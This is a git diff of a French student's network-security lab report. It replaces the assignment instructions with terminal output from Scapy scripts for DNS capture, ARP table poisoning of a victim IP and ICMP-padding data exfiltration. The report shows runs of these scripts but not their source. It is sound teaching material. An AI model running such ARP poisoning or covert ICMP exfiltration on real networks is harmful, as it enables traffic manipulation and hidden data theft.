@@ -37,79 +37,82 @@ TCP SYN ACK reçu !
 
 🌞 **`dns_cap.py`**
 
-- fonction `sniff()`
-- capturer une requête DNS et sa réponse
-  - une requête DNS pour connaître l'IP de `ynov.com`
-- **afficher uniquement** l'adresse contenue dans la réponse
-- utiliser une commande depuis votre terminal pour faire la requête DNS pendant que votre script `dns_cap.py` tourne
-  - `nslookup` sous Windows
-  - `dig` sous GNU/Linux
+```
+fmaxance@ZeyKiiPC:~$ dig ynov.com
+
+; <<>> DiG 9.18.19-1~deb12u1-Debian <<>> ynov.com
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 47655
+;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 512
+;; QUESTION SECTION:
+;ynov.com.                      IN      A
+
+;; ANSWER SECTION:
+ynov.com.               300     IN      A       104.26.10.233
+ynov.com.               300     IN      A       172.67.74.226
+ynov.com.               300     IN      A       104.26.11.233
+
+;; Query time: 23 msec
+;; SERVER: 8.8.8.8#53(8.8.8.8) (UDP)
+;; WHEN: Tue Nov 28 09:31:12 CET 2023
+;; MSG SIZE  rcvd: 85
+```
+
+```
+fmaxance@ZeyKiiPC:~/Repo/TP_Reseaux_B2$ sudo python3 dns_cap.py
+104.26.10.233
+```
 
 🌞 **`dns_lookup.py`**
 
-- craftez une requête DNS à la main
-- en entier encore là, toute la trame, vous devez utiliser la méthode `srp()`
+```
+fmaxance@ZeyKiiPC:~/Repo/TP_Reseaux_B2$ sudo python3 dns_lookup.py 
+Ether / IP / UDP / DNS Ans "104.26.10.233"
+```
 
 # II. ARP Poisoning
 
-BON VOUS ALLEZ PAS Y COUPER SI VOUS L'AVEZ JAMAIS FAIT.
-
-**P'tit détour rapide sur un ARP Poisoning simple.** Pas question de MITM ici, juste injecter une fausse donnée dans la table ARP de quelqu'un.
-
 🌞 **`arp_poisoning.py`**
 
-- craftez une trame ARP qui empoisonne la table d'un voisin
-  - je veux que, pour la victime, l'adresse IP `10.13.33.37` corresponde à la MAC `de:ad:be:ef:ca:fe`
-- **testez avec des VMs uniquement, ou entre vous uniquement**
-- prouvez avec une commande sur la machine victime que la fausse donnée a été injectée
-- vous n'avez le droit qu'aux fonctions `srp()`, `sr()`, `send()`, `sendp()`
+```
+fmaxance@ZeyKiiPC:~/Repo/TP_Reseaux_B2$ sudo python3 arp_poisoning.py
+Enter the victims ip: 10.33.74.177
+.
+Sent 1 packets.
+```
 
 # II. Exfiltration ICMP
 
-➜ **Ici, on va se servir de notre ami le ping pour exfiltrer des données.**
-
-Si vous n'aviez pas noté jusqu'alors en faisant joujou à la partie I, chaque paquet ICMP (ping et pong) contiennent une section appelée "padding" de taille variable, généralement remplie de 0. C'est là, on envoie plein de 0 sur le réseau, kom sa, à chaque ping.
-
-**C'est l'endroit idéal pour stocker des données meow.**
-
-P'tit schéma d'un paquet ICMP [~~volé sur internet ici~~](https://www.freesoft.org/CIE/Course/Section3/7.htm) :
-
-![Kikoo toa](./img/padding.png)
-
-**On va littéralement envoyer des pings, mais le padding on va l'utiliser pour stocker des données.** Autrement dit, on va utiliser des pings pour envoyer de la data à quelqu'un.
-
-Dans notre contexte : pour exfiltrer des données, on peut juste envoyer des ping enfet !
-
 🌞 **`icmp_exf_send.py`**
 
-- envoie un caractère passé en argument dans un ping
-  - un seul caractère pour le moment
-- l'IP destination est aussi passée en argument
-- on doit pouvoir faire par exemple :
-
-```bash
-# envoie le caractère "j" caché dans un ping vers 10.1.1.1
-$ python icmp_exfiltration_send_1.py 10.1.1.1 j
+```
+fmaxance@ZeyKiiPC:~/Repo/TP_Reseaux_B2$ sudo python3 icmp_exf_send.py 10.1.1.1 j
+.
+Sent 1 packets.
+Payload 'j' envoyé avec succès à 10.1.1.1.
 ```
 
-On peut récup les arguments passés au script comme ça :
-
-```python
-# La liste argv contient tous les arguments dans l'ordre
-from sys import argv
-
-print(f"Ceci est le premier argument : {argv[0]}.")
-print(f"Ceci est le deuxième argument : {argv[1]}.")
-```
+![icpm](images/icmp_exf_send.png)
 
 🌞 **`icmp_exf_receive.py`**
 
-- sniff le réseau
-- affiche **UNIQUEMENT** le caractère caché si un paquet ICMP d'exfiltration est reçu et quitte après réception de 1 paquet
-- si un ping legit est reçu, ou n'importe quoi d'autre votre code doit continuer à tourner
-- il attend (avec un filtre sur `sniff()` et des conditions dans la fonction qui traite le paquet) **uniquement** le ping qui contient les données exfiltrées, et les affiche
+Depuis le pc de doniban :
 
-> Mettez vous dans un setup à deux PCs, ou avec une VM, truc du genre.
+```
+python3 icmp_exf_send.py 10.33.73.20 meow
+```
+
+Sur mon pc:
+
+```
+fmaxance@ZeyKiiPC:~/Repo/TP_Reseaux_B2$ sudo python3 icmp_exf_receive.py
+Sniffing en cours...
+Caractère caché: meow
+```
 
 ⭐ **Bonus 1 easy :**
 
